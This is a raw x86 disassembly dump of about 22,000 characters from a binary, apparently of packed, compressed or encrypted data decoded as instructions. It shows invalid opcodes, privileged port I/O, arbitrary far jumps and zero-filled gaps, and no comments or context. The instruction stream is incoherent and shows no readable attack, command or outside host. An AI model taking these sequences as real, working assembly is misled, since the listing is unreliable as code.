  41bb60:	cmp    al,0x45
  41bb62:	sbb    eax,0xf41ac47a
  41bb67:	sub    BYTE PTR [edi-0x1b8fd850],cl
  41bb6d:	adc    al,BYTE PTR [eax]
	...
  41bbd3:	add    BYTE PTR [eax],al
  41bbd5:	add    BYTE PTR [edx],cl
  41bbd7:	mov    eax,0xbfb7aaa5
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi-0x1c],cx
  41bbe3:	push   ebx
  41bbe4:	mov    eax,ds:0x12a6797
  41bbe9:	add    BYTE PTR [eax],al
  41bbeb:	add    DWORD PTR [eax],eax
  41bbed:	add    BYTE PTR [esi+0x4de3ab5e],dl
  41bbf3:	xchg   DWORD PTR [edi+0x74],edi
  41bbf6:	jne    0x41bc1c
  41bbf8:	popa   
  41bbf9:	inc    eax
  41bbfa:	xchg   ebx,eax
  41bbfb:	retf   
  41bbfc:	data16 and cl,BYTE PTR [esi]
  41bbff:	nop
  41bc00:	jmp    FWORD PTR [edi-0xe]
  41bc03:	push   esp
  41bc04:	jg     0x41bc64
  41bc06:	adc    BYTE PTR [edx],cl
  41bc08:	dec    ecx
  41bc09:	iret   
  41bc0a:	cmp    BYTE PTR [esi],0x2f
  41bc0d:	outs   dx,DWORD PTR ds:[esi]
  41bc0e:	sub    ebp,DWORD PTR [eax]
  41bc10:	(bad)  
  41bc11:	inc    ebp
  41bc12:	and    eax,0x4fe94c8e
  41bc17:	and    eax,0xa88d4c51
  41bc1c:	inc    esi
  41bc1d:	jno    0x41bba0
  41bc1f:	pop    edx
  41bc20:	pop    edx
  41bc21:	cdq    
  41bc22:	jl     0x41bc3f
  41bc24:	fmul   st,st(5)
  41bc26:	lock xor ebx,edx
  41bc29:	xchg   esi,eax
  41bc2a:	xlat   BYTE PTR ds:[ebx]
  41bc2b:	pusha  
  41bc2c:	scas   al,BYTE PTR es:[edi]
  41bc2d:	mov    ebx,0x2331ed73
  41bc32:	fwait
  41bc33:	loopne 0x41bc8f
  41bc35:	das    
  41bc36:	aad    0x91
  41bc38:	xchg   esi,eax
  41bc39:	jno    0x41bc68
  41bc3b:	jmp    0x41bc5d
  41bc3d:	jno    0x41bc97
  41bc3f:	call   0xa284:0x4ce12e15
  41bc46:	dec    eax
  41bc47:	push   es
  41bc48:	and    ebx,DWORD PTR [eax+0x4a781622]
  41bc4e:	sub    DWORD PTR [eax-0x4d],eax
  41bc51:	ret    
  41bc52:	ret    0x6c23
  41bc55:	push   ebx
  41bc56:	out    dx,al
  41bc57:	pop    ebx
  41bc58:	lea    ebp,[ebp+0x66]
  41bc5b:	in     eax,0x95
  41bc5d:	xchg   esi,eax
  41bc5e:	adc    al,BYTE PTR [edi-0x36]
  41bc61:	imul   esp,DWORD PTR [eax-0x1ada0374],0xed2a8fca
  41bc6b:	lods   eax,DWORD PTR ds:[esi]
  41bc6c:	test   eax,0x391b290a
  41bc71:	lods   eax,DWORD PTR ds:[esi]
  41bc72:	mov    cl,0xe6
  41bc74:	pop    esi
  41bc75:	lods   al,BYTE PTR ds:[esi]
  41bc76:	(bad)  
  41bc78:	jmp    0x757caeef
  41bc7d:	and    eax,0x41c3354e
  41bc82:	sub    dl,BYTE PTR [ecx+0x404d1dd]
  41bc88:	or     bh,BYTE PTR [ecx]
  41bc8a:	mov    BYTE PTR [edx-0x35],bl
  41bc8d:	xchg   edi,eax
  41bc8e:	test   eax,0xbc7a762a
  41bc93:	fdivrp st(5),st
  41bc95:	push   0xe57e9509
  41bc9a:	fistp  WORD PTR [edi-0x6c5d49ef]
  41bca0:	lods   eax,DWORD PTR ds:[esi]
  41bca1:	jg     0x41bca8
  41bca3:	stc    
  41bca4:	mov    al,0x45
  41bca6:	cmp    al,0xf
  41bca8:	imul   ebp,DWORD PTR [edi],0x49
  41bcab:	jmp    0x41bc7a
  41bcad:	inc    eax
  41bcae:	sbb    eax,0xbc20031f
  41bcb3:	push   edi
  41bcb4:	out    dx,al
  41bcb5:	push   ecx
  41bcb6:	mov    DWORD PTR [edx+0x28],edi
  41bcb9:	pop    es
  41bcba:	sub    bh,bl
  41bcbc:	gs cli 
  41bcbe:	call   0xc5d9:0xe4f5d0dd
  41bcc5:	mov    dh,0x13
  41bcc7:	aam    0xa3
  41bcc9:	cld    
  41bcca:	pop    esi
  41bccb:	cmp    esi,edx
  41bccd:	std    
  41bcce:	add    BYTE PTR ds:0xab5cfecb,bh
  41bcd4:	push   ebx
  41bcd5:	or     eax,0xe26caf61
  41bcda:	pop    ss
  41bcdb:	popa   
  41bcdc:	rcl    DWORD PTR [ebp+0x560ba5c9],1
  41bce2:	or     BYTE PTR gs:[ecx-0x6a],al
  41bce6:	mov    ebx,0xc86bf283
  41bceb:	ja     0x41bccb
  41bced:	xor    DWORD PTR [eax],eax
	...
  41bd53:	add    BYTE PTR [eax],al
  41bd55:	add    dl,dl
  41bd57:	xor    bh,dl
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0xe459d9d8
  41bd64:	sbb    al,ch
  41bd66:	sub    eax,DWORD PTR [bx+di]
  41bd69:	add    BYTE PTR [eax],al
  41bd6b:	add    DWORD PTR [eax],eax
  41bd6d:	add    bl,cl
  41bd6f:	push   0x85489415
  41bd74:	pushf  
  41bd75:	add    eax,DWORD PTR [eax+0x16]
  41bd78:	mov    bl,0xb
  41bd7a:	mov    ds:0x25a12ce8,eax
  41bd7f:	mov    edi,0x968a9dc5
  41bd84:	scas   eax,DWORD PTR es:[edi]
  41bd85:	lods   eax,DWORD PTR ds:[esi]
  41bd86:	std    
  41bd87:	mov    al,0x28
  41bd89:	cmp    DWORD PTR fs:[ebx+0x56],0xffffffbf
  41bd8e:	dec    ebp
  41bd8f:	adc    dh,BYTE PTR ds:[ebx]
  41bd92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd93:	push   ds
  41bd94:	shr    BYTE PTR [edi-0x1d597335],cl
  41bd9a:	(bad)  
  41bd9b:	dec    eax
  41bd9c:	xor    BYTE PTR [ebx+ebp*2-0x4f7c1840],dl
  41bda3:	aad    0x12
  41bda5:	clc    
  41bda6:	push   0xffffff82
  41bda8:	aaa    
  41bda9:	fcomp  QWORD PTR [edx-0x6b]
  41bdac:	push   eax
  41bdad:	pop    eax
  41bdae:	or     esi,DWORD PTR [esi-0x13cd6e63]
  41bdb4:	call   0x1a31c311
  41bdb9:	lock call 0x3738:0xa78682ab
  41bdc1:	mov    gs,WORD PTR [esp+ebx*1+0x3866654f]
  41bdc8:	scas   al,BYTE PTR es:[edi]
  41bdc9:	leave  
  41bdca:	pop    eax
  41bdcb:	icebp  
  41bdcc:	rol    BYTE PTR [eax-0x51],0x30
  41bdd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdd1:	mov    ecx,0xef104f24
  41bdd6:	xor    al,BYTE PTR [ebx]
  41bdd8:	scas   eax,DWORD PTR es:[edi]
  41bdd9:	mov    esi,ebp
  41bddb:	or     eax,ebx
  41bddd:	add    eax,0x9064a672
  41bde2:	add    dl,BYTE PTR [eax]
  41bde4:	and    BYTE PTR [eax-0x75336728],dl
  41bdea:	sahf   
  41bdeb:	push   es
  41bdec:	cmp    DWORD PTR [eax],ebp
  41bdee:	addr16 adc eax,0x5345f8e6
  41bdf4:	loopne 0x41be51
  41bdf6:	add    al,0x22
  41bdf8:	inc    ecx
  41bdf9:	mul    dl
  41bdfb:	push   es
  41bdfc:	scas   al,BYTE PTR es:[edi]
  41bdfd:	cld    
  41bdfe:	in     al,dx
  41bdff:	test   al,0x2d
  41be01:	(bad)  
  41be02:	repz cwde 
  41be04:	mov    ah,0x49
  41be06:	fs pop ecx
  41be08:	mov    ebp,0x5831d53e
  41be0d:	mul    DWORD PTR [eax]
  41be0f:	jns    0x41be4c
  41be11:	repz mov ebx,DWORD PTR cs:[esi-0x3d]
  41be16:	fisub  WORD PTR [edx+0xd]
  41be19:	clc    
  41be1a:	clc    
  41be1b:	jmp    0x6c0c:0x9a1d1256
  41be22:	mov    ebx,0x19c08c4d
  41be27:	mov    dh,0x3a
  41be29:	popf   
  41be2a:	pop    ds
  41be2b:	fbld   TBYTE PTR [ebx+0x5e]
  41be2e:	fs jns 0x41bdcc
  41be31:	jmp    0xd465:0x6364c35f
  41be38:	xchg   bl,dl
  41be3a:	pop    ss
  41be3b:	pushf  
  41be3c:	retf   
  41be3d:	jmp    0x41be52
  41be3f:	ins    DWORD PTR es:[edi],dx
  41be40:	lods   al,BYTE PTR ds:[esi]
  41be41:	mov    ch,0x80
  41be43:	xor    BYTE PTR [eax],al
  41be45:	dec    eax
  41be47:	nop    ebx
  41be4a:	jmp    0x41be72
  41be4c:	out    0x65,al
  41be4e:	mov    bh,0xfa
  41be50:	dec    eax
  41be51:	dec    esp
  41be52:	mov    ah,0x25
  41be54:	loopne 0x41bdec
  41be56:	adc    al,0xef
  41be58:	fidivr WORD PTR [eax]
  41be5a:	push   ds
  41be5b:	cmp    DWORD PTR [eax],0x1d
  41be5e:	mov    ds:0x787bdbf1,al
  41be63:	test   edx,ecx
  41be65:	test   BYTE PTR [ebx],cl
  41be67:	sahf   
  41be68:	jbe    0x41be0b
  41be6a:	inc    ecx
  41be6b:	push   ebx
  41be6c:	jg     0x41be77
	...
  41bed6:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41bedc:	imul   edi
  41bede:	mov    ebp,DWORD PTR [ecx+0x1cf63f66]
  41bee4:	add    al,0x79
  41bee6:	addr16 sub al,0x1
  41bee9:	add    BYTE PTR [eax],al
  41beeb:	add    DWORD PTR [eax],eax
  41beed:	add    BYTE PTR [edx+eiz*4],cl
  41bef0:	retf   0x9b6e
  41bef3:	dec    ecx
  41bef4:	or     edi,DWORD PTR [ebx+0x19]
  41bef7:	mov    ecx,DWORD PTR [eax+edi*4-0xa]
  41befb:	nop
  41befc:	mov    BYTE PTR [eax-0x7c],ch
  41beff:	adc    eax,0x3eae0733
  41bf04:	sub    BYTE PTR [edx],ah
  41bf06:	sbb    esp,DWORD PTR [ebx+0x45c0f3a1]
  41bf0c:	and    al,0x8b
  41bf0e:	repnz sti 
  41bf10:	mov    ch,0x78
  41bf12:	add    al,ah
  41bf14:	mov    ds:0x6134765f,eax
  41bf19:	icebp  
  41bf1a:	retf   
  41bf1b:	sub    esi,edx
  41bf1d:	cmp    bl,dl
  41bf1f:	jecxz  0x41bec1
  41bf21:	mov    ds:0x6946fc43,al
  41bf26:	or     dl,cl
  41bf28:	xchg   ebx,eax
  41bf29:	push   ebx
  41bf2a:	test   al,0xd5
  41bf2c:	dec    edi
  41bf2d:	mov    ss,WORD PTR ds:0x4eaea7a0
  41bf33:	xchg   ecx,eax
  41bf34:	sbb    al,0xfd
  41bf36:	imul   ebp,DWORD PTR [ebp+0x6d],0x649f9bc0
  41bf3d:	adc    ebx,ecx
  41bf3f:	int    0xbe
  41bf41:	mov    dh,0xaa
  41bf43:	sbb    edx,ecx
  41bf45:	push   esi
  41bf46:	lods   al,BYTE PTR ds:[esi]
  41bf47:	cmp    esp,edi
  41bf49:	scas   al,BYTE PTR es:[edi]
  41bf4a:	cmp    al,0x94
  41bf4c:	int    0xba
  41bf4e:	push   edx
  41bf4f:	mov    DWORD PTR [eax-0x5abe0bbf],ebp
  41bf55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf56:	scas   al,BYTE PTR es:[edi]
  41bf57:	mov    bh,0x39
  41bf59:	mov    al,ds:0xaa3ec659
  41bf5e:	fs stos BYTE PTR es:[edi],al
  41bf60:	dec    edi
  41bf61:	loop   0x41beed
  41bf63:	scas   eax,DWORD PTR es:[edi]
  41bf64:	pop    edi
  41bf65:	jb     0x41bf79
  41bf67:	imul   DWORD PTR [ebx]
  41bf69:	jg     0x41bfc8
  41bf6b:	sti    
  41bf6c:	push   ds
  41bf6d:	dec    BYTE PTR [edi-0x5e]
  41bf70:	cdq    
  41bf71:	xchg   ebp,eax
  41bf72:	fild   WORD PTR [ecx-0x37]
  41bf75:	jp     0x41bfe4
  41bf77:	data16 add al,0x67
  41bf7a:	adc    BYTE PTR [ecx+0x3],al
  41bf7d:	inc    ecx
  41bf7e:	push   0xffffff84
  41bf80:	xchg   esp,eax
  41bf81:	adc    DWORD PTR [edx+0x2d],esi
  41bf84:	int    0x66
  41bf86:	push   ebp
  41bf87:	pop    edi
  41bf88:	mov    esi,0x39a8a0a9
  41bf8d:	push   es
  41bf8e:	mov    bh,0xe4
  41bf90:	mov    dl,BYTE PTR [edi+0x7c234cde]
  41bf96:	out    0xd6,eax
  41bf98:	inc    esi
  41bf99:	jmp    0x25fc:0xa7091bd2
  41bfa0:	lods   al,BYTE PTR ds:[esi]
  41bfa1:	sub    al,BYTE PTR ss:[eax+ecx*2-0x1f68cce9]
  41bfa9:	dec    eax
  41bfaa:	cwde   
  41bfab:	jb     0x41bff5
  41bfad:	push   ebp
  41bfae:	cwde   
  41bfaf:	test   al,0x2a
  41bfb1:	pop    ecx
  41bfb2:	out    0xc5,al
  41bfb4:	mov    edi,0xc6d695a6
  41bfb9:	rol    BYTE PTR [ebp+0x3dadbc10],0xbd
  41bfc0:	aaa    
  41bfc1:	and    eax,DWORD PTR ds:0x43433b9f
  41bfc7:	dec    ebx
  41bfc8:	inc    esi
  41bfc9:	scas   al,BYTE PTR es:[edi]
  41bfca:	dec    edi
  41bfcb:	stos   DWORD PTR es:[edi],eax
  41bfcc:	ret    0x4565
  41bfcf:	push   DWORD PTR [ecx+0x45]
  41bfd2:	les    edx,FWORD PTR [ecx]
  41bfd4:	es mov dl,bl
  41bfd7:	(bad)  
  41bfd8:	mov    esi,0xde37a974
  41bfdd:	cdq    
  41bfde:	xchg   esp,eax
  41bfdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfe0:	fidivr WORD PTR ds:0x3aea2be8
  41bfe6:	(bad)  
  41bfe7:	lahf   
  41bfe8:	mov    dh,0xcc
  41bfea:	dec    ebx
  41bfeb:	pop    ss
  41bfec:	es stos DWORD PTR es:[edi],eax
	...
  41c056:	fs jae 0x41c08c
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	lods   eax,DWORD PTR ds:[esi]
  41c063:	fdivr  QWORD PTR ds:0x12d67d8
  41c069:	add    BYTE PTR [eax],al
  41c06b:	add    DWORD PTR [eax],eax
  41c06d:	add    BYTE PTR [ebp+ecx*2-0x43],cl
  41c071:	shl    DWORD PTR [esi],cl
  41c073:	outs   dx,BYTE PTR ds:[esi]
  41c074:	out    dx,al
  41c075:	scas   al,BYTE PTR es:[edi]
  41c076:	test   DWORD PTR [edi+edi*1+0x36705b2a],eax
  41c07d:	jo     0x41c09c
  41c07f:	sub    ebx,DWORD PTR [eax-0x6f3455c5]
  41c085:	ss push es
  41c087:	shl    BYTE PTR [esi+ebp*1-0x57],1
  41c08b:	push   0x2
  41c08d:	popf   
  41c08e:	xor    ebp,ebp
  41c090:	mov    dl,dl
  41c092:	ret    
  41c093:	push   edi
  41c094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c095:	xor    BYTE PTR [esi+0x71fe7572],bl
  41c09b:	inc    edx
  41c09c:	(bad)  
  41c09d:	xchg   esi,eax
  41c09e:	dec    ebx
  41c09f:	mov    ch,0x4f
  41c0a1:	in     eax,0xd8
  41c0a3:	sbb    bh,BYTE PTR [ecx+ecx*1-0x17]
  41c0a7:	js     0x41c094
  41c0a9:	hlt    
  41c0aa:	icebp  
  41c0ab:	inc    ebx
  41c0ac:	out    dx,eax
  41c0ad:	fs and eax,0x151243ab
  41c0b3:	dec    ebx
  41c0b4:	xor    eax,0x78c48426
  41c0b9:	xchg   ebx,eax
  41c0ba:	icebp  
  41c0bb:	lahf   
  41c0bc:	xchg   esp,eax
  41c0bd:	aad    0xe3
  41c0bf:	pop    ds
  41c0c0:	pop    esi
  41c0c1:	andps  xmm4,XMMWORD PTR [ebx+0x97c4c37]
  41c0c8:	pushf  
  41c0c9:	fsubp  st(0),st
  41c0cb:	mov    esi,0x7cf16653
  41c0d0:	cmc    
  41c0d1:	xchg   edi,eax
  41c0d2:	push   ss
  41c0d3:	je     0x41c062
  41c0d5:	aam    0xd8
  41c0d7:	sbb    BYTE PTR cs:[ebx],al
  41c0da:	push   ds
  41c0db:	fisttp WORD PTR [esi+eiz*4]
  41c0de:	or     al,BYTE PTR [eax+0x1f]
  41c0e1:	pop    ss
  41c0e2:	and    DWORD PTR [edx],esp
  41c0e4:	aad    0x85
  41c0e6:	pop    edi
  41c0e7:	adc    al,0x71
  41c0e9:	lods   al,BYTE PTR ds:[esi]
  41c0ea:	dec    dh
  41c0ec:	sbb    DWORD PTR [ebx+0x11],edx
  41c0ef:	jnp    0x41c086
  41c0f1:	into   
  41c0f2:	and    al,0x7f
  41c0f4:	out    dx,al
  41c0f5:	test   al,0x4f
  41c0f7:	xlat   BYTE PTR ds:[ebx]
  41c0f8:	push   edx
  41c0f9:	pop    ecx
  41c0fa:	jp     0x41c0bb
  41c0fc:	jo     0x41c16e
  41c0fe:	mov    ds:0x1379f814,al
  41c103:	sbb    DWORD PTR [eax-0x34171f62],esi
  41c109:	nop
  41c10a:	xchg   BYTE PTR [edx],ah
  41c10c:	fiadd  DWORD PTR [ebp+0x3a]
  41c10f:	test   BYTE PTR [ebx+0x4f88939c],ch
  41c115:	lds    ebp,FWORD PTR [esi+eiz*8]
  41c118:	stos   DWORD PTR es:[edi],eax
  41c119:	lea    ecx,[ecx-0x1e6f570e]
  41c11f:	mov    ah,0xe2
  41c121:	js     0x41c11c
  41c123:	adc    BYTE PTR [ecx+0x2f],dh
  41c126:	daa    
  41c127:	mov    dh,0x58
  41c129:	adc    eax,0x67ce1fc7
  41c12e:	add    al,0x51
  41c130:	lock add esi,ebp
  41c133:	les    esp,FWORD PTR [ebx-0x41]
  41c136:	neg    bh
  41c138:	pop    ss
  41c139:	mov    ds:0x8c2de953,eax
  41c13e:	enter  0x70d9,0xba
  41c142:	fwait
  41c143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c144:	mov    edi,0x5ed0fb26
  41c149:	mov    ah,cl
  41c14b:	dec    esp
  41c14c:	dec    edi
  41c14d:	or     ebp,edx
  41c14f:	nop
  41c150:	jnp    0x41c0e4
  41c152:	loop   0x41c15d
  41c154:	and    eax,DWORD PTR [esp+ebp*1+0x73]
  41c158:	unpcklps xmm6,XMMWORD PTR [eax+0x7d]
  41c15c:	jmp    FWORD PTR [ebp+0x42c336b9]
  41c162:	dec    eax
  41c163:	adc    BYTE PTR [ebx],dh
  41c165:	or     cl,BYTE PTR [ebp-0x5b]
  41c168:	pop    esi
  41c169:	arpl   WORD PTR [eax+0x2d29bc],cx
	...
  41c1d3:	add    BYTE PTR [eax],al
  41c1d5:	add    cl,bl
  41c1d7:	dec    edx
  41c1d8:	mov    eax,ds:0xd9fbb3f8
  41c1dd:	imul   edi,DWORD PTR ds:0x2fe90501,0xffffffcb
  41c1e4:	or     BYTE PTR [edi+eiz*2],bl
  41c1e7:	add    DWORD PTR cs:[eax],eax
  41c1ea:	add    BYTE PTR [ecx],al
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	sub    bh,al
  41c1f0:	ds gs cmc 
  41c1f3:	ret    0x71c4
  41c1f6:	out    dx,eax
  41c1f7:	push   ecx
  41c1f8:	mov    dh,0xa7
  41c1fa:	and    al,0x2
  41c1fc:	push   es
  41c1fd:	mov    al,ds:0xd96f4ae5
  41c202:	into   
  41c203:	das    
  41c204:	cmp    al,0x59
  41c206:	sbb    BYTE PTR [edi+0x4e],bh
  41c209:	xor    ebx,eax
  41c20b:	cld    
  41c20c:	dec    esi
  41c20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c20e:	pop    ebp
  41c20f:	mov    gs,WORD PTR [eax-0x6c]
  41c212:	xlat   BYTE PTR ds:[ebx]
  41c213:	fadd   DWORD PTR [ebp+0x4]
  41c216:	arpl   WORD PTR [bx+si],bp
  41c219:	adc    DWORD PTR [edi+eiz*4-0x36ff1068],ecx
  41c220:	ins    DWORD PTR es:[edi],dx
  41c221:	and    DWORD PTR [ecx+0x6e],0x5cba1ba3
  41c228:	mov    ah,0x32
  41c22a:	jle    0x41c266
  41c22c:	hlt    
  41c22d:	aas    
  41c22e:	aad    0x92
  41c230:	in     eax,0x9c
  41c232:	pushf  
  41c233:	mov    edi,0xea190839
  41c238:	scas   eax,DWORD PTR es:[edi]
  41c239:	adc    BYTE PTR [eax],dh
  41c23b:	sahf   
  41c23c:	push   0xe89510b1
  41c241:	scas   eax,DWORD PTR es:[edi]
  41c242:	or     BYTE PTR [edx],dl
  41c244:	rol    DWORD PTR [ecx],cl
  41c246:	test   eax,0x790a681e
  41c24b:	lds    esi,FWORD PTR [ebp-0x40]
  41c24e:	mov    cl,0x9a
  41c250:	jg     0x41c218
  41c252:	cld    
  41c253:	jnp    0x41c1f4
  41c255:	pop    ebx
  41c256:	sbb    eax,0x8aaacd96
  41c25b:	sub    BYTE PTR [ebx-0x66],dl
  41c25e:	mov    edx,DWORD PTR [eax+0x75b769c7]
  41c264:	(bad)
  41c267:	cli    
  41c268:	inc    ecx
  41c269:	arpl   WORD PTR [eax+0xcc1f5e6],sp
  41c26f:	cwde   
  41c270:	mov    ah,0x6b
  41c272:	push   ss
  41c273:	test   al,0x24
  41c275:	pop    ds
  41c276:	je     0x41c268
  41c278:	or     eax,0x5dfd3435
  41c27d:	je     0x41c276
  41c27f:	mov    cl,0xeb
  41c281:	icebp  
  41c282:	outs   dx,BYTE PTR ds:[esi]
  41c283:	ja     0x41c304
  41c285:	fsubr  DWORD PTR [edx-0x56f7a5ad]
  41c28b:	xor    al,0xf4
  41c28d:	sbb    ebx,DWORD PTR [edx+esi*4+0x74]
  41c291:	ret    
  41c292:	lahf   
  41c293:	dec    esi
  41c294:	sbb    bh,BYTE PTR ds:0xaa980e0d
  41c29a:	or     al,0xe0
  41c29c:	xor    al,0x9c
  41c29e:	jno    0x41c2d4
  41c2a0:	cmp    eax,0xe6a3480f
  41c2a5:	mov    ah,0xb4
  41c2a7:	mov    al,ds:0x6437d442
  41c2ac:	or     BYTE PTR [ebx-0x4b],dh
  41c2af:	adc    BYTE PTR [esi-0x6fe1b979],cl
  41c2b5:	push   ebx
  41c2b6:	or     dl,BYTE PTR [edi]
  41c2b8:	jl     0x41c287
  41c2ba:	mov    bl,0x1e
  41c2bc:	test   al,0x49
  41c2be:	mov    ds:0x5d0981a1,eax
  41c2c3:	fprem  
  41c2c5:	mov    cl,0x67
  41c2c7:	xchg   DWORD PTR [edx-0x48a8b28e],ecx
  41c2cd:	mov    esi,DWORD PTR [ebx-0x22]
  41c2d0:	lds    ebp,FWORD PTR [edi+ecx*8-0x44]
  41c2d4:	add    DWORD PTR [ebp+ecx*1+0x16],eax
  41c2d8:	fcmovne st,st(6)
  41c2da:	test   BYTE PTR [eax],0x86
  41c2dd:	out    0x44,al
  41c2df:	mov    edi,gs
  41c2e1:	add    DWORD PTR [esi+0x5a59ae96],0x815904b4
  41c2eb:	push   es
  41c2ec:	call   0x0:0x36
	...
  41c353:	add    BYTE PTR [eax],al
  41c355:	add    bl,dh
  41c357:	and    ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	(bad)  
  41c364:	jecxz  0x41c383
  41c366:	addr16 das 
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	add    BYTE PTR [ecx],al
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	xchg   edx,eax
  41c36f:	mov    dl,0x45
  41c371:	fstp   QWORD PTR [edx]
  41c373:	push   ecx
  41c374:	sar    BYTE PTR [ebp+edi*4+0x13],0x2
  41c379:	push   ebp
  41c37a:	imul   ebx,DWORD PTR [eax],0x77f1b1a9
  41c380:	dec    ebx
  41c381:	push   ss
  41c382:	icebp  
  41c383:	pop    edx
  41c384:	ja     0x41c365
  41c386:	imul   esp,DWORD PTR [edx+0x211d288],0xffffffc5
  41c38d:	push   ebx
  41c38e:	mov    ah,0x88
  41c390:	push   0xe60cd473
  41c395:	inc    edx
  41c396:	addr16 dec esi
  41c398:	in     al,0x26
  41c39a:	aam    0x35
  41c39c:	pop    esp
  41c39d:	fimul  DWORD PTR [edi+0x3f79b841]
  41c3a3:	outs   dx,DWORD PTR ds:[esi]
  41c3a4:	sub    ecx,0x3e9b977f
  41c3aa:	and    BYTE PTR [edi],ch
  41c3ac:	mov    bl,0x38
  41c3ae:	push   0xffffffc8
  41c3b0:	jecxz  0x41c413
  41c3b2:	mov    ebx,0xb0f776d1
  41c3b7:	adc    al,BYTE PTR [edi]
  41c3b9:	mov    esi,0x13caa361
  41c3be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3bf:	push   edi
  41c3c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3c1:	je     0x41c3c1
  41c3c3:	imul   DWORD PTR [esi-0x41]
  41c3c6:	js     0x41c3c5
  41c3c8:	(bad)  
  41c3ca:	adc    DWORD PTR [ebp-0x3c],0xbe15087c
  41c3d1:	clc    
  41c3d2:	pop    ebx
  41c3d3:	addr16 (bad) 
  41c3d5:	dec    ebp
  41c3d6:	fiadd  WORD PTR cs:[ebx]
  41c3d9:	loope  0x41c3dd
  41c3db:	sub    eax,0x968e62af
  41c3e0:	retf   
  41c3e1:	fsubrp st(5),st
  41c3e3:	nop
  41c3e4:	push   esp
  41c3e5:	aaa    
  41c3e6:	clc    
  41c3e7:	(bad)  
  41c3e8:	jmp    0x60d8:0xc3db198f
  41c3ef:	repz mov eax,ds:0xb3375d23
  41c3f5:	sahf   
  41c3f6:	test   al,0x99
  41c3f8:	cmp    ch,dh
  41c3fa:	and    eax,DWORD PTR [edi+0x3de6ac81]
  41c400:	pushf  
  41c401:	sbb    BYTE PTR ds:[ecx],bl
  41c404:	in     eax,0x18
  41c406:	mov    edi,0xa5bfee4a
  41c40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c40c:	imul   ecx,esi,0x1d
  41c40f:	sub    eax,0x28bcf63b
  41c414:	inc    ebx
  41c415:	mov    ah,0x4
  41c417:	add    DWORD PTR ds:0x305868a7,eax
  41c41d:	sbb    eax,0x24211074
  41c422:	cmp    DWORD PTR [ebp-0x10],esi
  41c425:	ret    
  41c426:	fcom   DWORD PTR [eax+0x69]
  41c429:	pop    ecx
  41c42a:	clc    
  41c42b:	dec    esp
  41c42c:	int3   
  41c42d:	mov    esi,es
  41c42f:	push   es
  41c430:	jae    0x41c43c
  41c432:	sbb    BYTE PTR ds:0xd7f4ec59,al
  41c438:	and    eax,0xfd76fc87
  41c43d:	adc    al,0x37
  41c43f:	push   ecx
  41c440:	mov    bl,0x9c
  41c442:	stos   DWORD PTR es:[edi],eax
  41c443:	and    al,0xcf
  41c445:	pop    ss
  41c446:	mov    ebx,DWORD PTR [edi-0x5fdd40db]
  41c44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c44d:	call   0x8552cef9
  41c452:	lahf   
  41c453:	adc    al,0x12
  41c455:	pop    eax
  41c456:	xor    ah,BYTE PTR [ebp-0x5b]
  41c459:	fdivr  QWORD PTR [ebp-0x3bb763a2]
  41c45f:	in     eax,0xff
  41c461:	inc    eax
  41c462:	pusha  
  41c463:	mov    ebx,0xd038e849
  41c468:	lds    ecx,FWORD PTR [esi]
  41c46a:	sbb    ah,dl
  41c46c:	lds    edx,FWORD PTR [edi+0x0]
	...
  41c4d3:	add    BYTE PTR [eax],al
  41c4d5:	add    BYTE PTR [ebx+0x20],dl
  41c4d8:	mov    al,ds:0x5faef3ae
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	cwde   
  41c4e3:	test   al,0xc4
  41c4e5:	data16 xor BYTE PTR [bx+di],al
  41c4e9:	add    BYTE PTR [eax],al
  41c4eb:	add    DWORD PTR [eax],eax
  41c4ed:	add    cl,ch
  41c4ef:	cli    
  41c4f0:	xchg   ebp,eax
  41c4f1:	shr    BYTE PTR [ebp+0x14],0x94
  41c4f5:	in     al,dx
  41c4f6:	mov    ebp,0x37831a69
  41c4fb:	popa   
  41c4fc:	ret    
  41c4fd:	inc    eax
  41c4fe:	push   eax
  41c4ff:	inc    ecx
  41c500:	push   ecx
  41c501:	or     DWORD PTR [ebx+0x5a3492a4],eax
  41c507:	pop    ebp
  41c508:	pop    ebp
  41c509:	mov    esi,DWORD PTR [edi-0x714a8491]
  41c50f:	je     0x41c558
  41c511:	call   0xa70a992b
  41c516:	mov    dl,0x73
  41c518:	sub    eax,0x36139929
  41c51d:	cmp    al,0xd5
  41c51f:	js     0x41c513
  41c521:	loopne 0x41c4a9
  41c523:	loopne 0x41c4f6
  41c525:	fxtract 
  41c527:	shl    DWORD PTR [edx+0x5a],0x13
  41c52b:	xor    DWORD PTR [ebx+ecx*4-0x5c],edi
  41c52f:	jbe    0x41c4cc
  41c531:	out    dx,al
  41c532:	and    al,0xb7
  41c534:	inc    esi
  41c535:	jbe    0x41c5b6
  41c537:	xor    cl,ch
  41c539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c53a:	call   0x8a32ada8
  41c53f:	xor    eax,0x63302d3b
  41c544:	mov    ebp,0x12778015
